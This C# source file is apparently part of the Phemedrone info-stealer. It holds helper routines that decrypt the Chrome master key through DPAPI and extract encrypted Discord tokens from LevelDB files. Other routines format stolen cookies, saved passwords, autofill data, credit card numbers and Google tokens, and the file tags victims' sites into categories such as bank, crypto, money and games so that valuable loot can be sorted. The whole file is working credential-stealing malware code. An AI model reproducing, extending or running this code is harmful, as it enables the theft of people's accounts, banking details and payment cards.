using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Text.RegularExpressions;
using Phemedrone.Cryptography;

namespace Phemedrone.Extensions
{
    public static class BrowserHelpers
    {
        public static string FormatCookie(string hostname, string httpOnly, string path,
            string secure, string expires, string name, string value)
        {
            ServiceCounter.CookieCount++;
            return $"{hostname}\t{httpOnly}\t{path}\t{secure}\t{expires}\t{name}\t{value}";
        }

        public static string GoogleToken(string aid, string token, string browser, string profile)
        {
            return $"Account ID: {aid}\r\nToken: {token}\r\nBrowser: {browser}[{profile}]";
        }

        public static string FormatAutofill(string name, string value)
        {
            ServiceCounter.AutoFillCount++;
            return $"Name: {name}\r\nValue: {value}";
        }

        public static string FormatPassword(string url, string username, string password, string browserName,
            string browserVersion, string profileName)
            => $"URL: {url}\r\nUsername: {ParsePasswordsValues(username)}\r\nPassword: {ParsePasswordsValues(password)}\r\nBrowser: {browserName} v{browserVersion} ({profileName})";


        public static string FormatCreditCard(string number, string placeholder, long month, long year,
            string browserName, string browserVersion, string profileName)
        {
            ServiceCounter.CreditCardCount++;
            return
                $"Number: {number}\r\nPlaceholder: {placeholder}\r\nExpiration: {month}/{year}\r\nBrowser: {browserName} v{browserVersion} ({profileName})";
        }

        private static string ParsePasswordsValues(string value)
        {
            if (string.IsNullOrEmpty(value) || value == "")
            {
                return "UNKNOWN";
            }

            return value;
        }

        public static List<string> ParseDiscordTokens(string levelDbPath, byte[] key)
        {
            return
                (from file in FileManager.EnumerateFiles(levelDbPath, "*.ldb", 1)
                let data = File.ReadAllText(file)
                from Match match in Regex.Matches(data, "dQw4w9WgXcQ:[^\"]*")
                let encrypted = match.Value.Split(new[] { "dQw4w9WgXcQ:" }, StringSplitOptions.None)[1]
                select AesGcm.DecryptValue(Convert.FromBase64String(encrypted), key)).ToList();
        }
        
        public static byte[] ParseMasterKey(string localStateFile)
        {
            var content = NullableValue.Call(() =>File.ReadAllText(localStateFile));
            if (content == null) return null;
            var jsonParser = new JsonParser();
            var key = jsonParser.ParseStringV2("encrypted_key", content);
            if (key.Length < 1) return null;
            var decoded = Convert.FromBase64String(key);

            return Encoding.UTF8.GetString(decoded, 0, 5) != "DPAPI"
                ? null
                : DpApi.Decrypt(decoded.Skip(5).Take(decoded.Length - 5).ToArray());
        }
        
        public static bool NewEncryption(string version, string browserName)
        {
            var ver = Convert.ToInt32(version.Split('.').First());

            return ver >= 127 && browserName == "Chrome";
        }

        public static List<string> ParseDatabase(string dbPath, string tableName,
            Func<Func<int, object>, string> lineHandler)
        {
            if (!File.Exists(dbPath)) return new List<string>();

            var reader = SQLiteReader.Create(dbPath);
            if (reader == null) return new List<string>();
            if (!reader.ReadTable(tableName)) return new List<string>();

            var content = new List<string>();
            for (var i = 0; i < reader.GetRowCount(); i++)
            {
                var row = i;
                var line = lineHandler(j => reader.GetValue(row, j));
                if (line == null) continue;
                content.Add(line);
            }

            return content;
        }

        public static List<string> ListBrowsers(string rootLocation, Func<string, bool> performCheck)
        {
            var browserLocations = new List<string>();
            var currentLocations = new List<string>
            {
                rootLocation
            };
            for (var depth = 0; depth < 2; depth++)
            {
                var newLocations = new List<string>();
                foreach (var directory in currentLocations.SelectMany(Directory.GetDirectories))
                {
                    try
                    {
                        if (performCheck(directory))
                        {
                            browserLocations.Add(directory);
                            continue;
                        }

                        if (Directory.GetFiles(directory).Length > 0) continue;
                        newLocations.Add(directory);
                    }
                    catch
                    {
                        // ignored bc it's basically unauthorized access exception
                    }
                }

                currentLocations = newLocations;
            }

            return browserLocations;
        }

        private static readonly Dictionary<string, string[]> Tags = new()
        {
            // you can add domains in tags
            // or create your own tag by adding new line: { "TAG NAME", new[] { "first.domain.com", "second.domain.com" } },
            
            { "CHEATS", new[] { "celka.", "nursultan.", "xone",
                "akrien","interium","nixware","skeet" } },
            
            { "GAMES", new[] { "roblox.com.", "genshin", "minecraft.net",
                "epicgames.com","steampowered.com"} },
            
            {"BANK", new[] {"tinkoff", "sberbank"}},
            
            {"MONEY", new[] {"yoomoney", "amazon","funpay","americanexpress"}},
            
            {"CRYPTO", new[] {"binance", "bybit"}},
        };
        public static void CookiesTags(string url)
        {
            var tag = Tags.FirstOrDefault(t => t.Value.Any(url.Contains)).Key;
            if (tag != default) 
                ServiceCounter.CookiesTags.Add(tag);
        }
        public static void PasswordsTags(string url)
        {
            var tag = Tags.FirstOrDefault(t => t.Value.Any(url.Contains)).Key;
            if (tag != default) 
                ServiceCounter.PasswordsTags.Add(tag);
        }
    }
}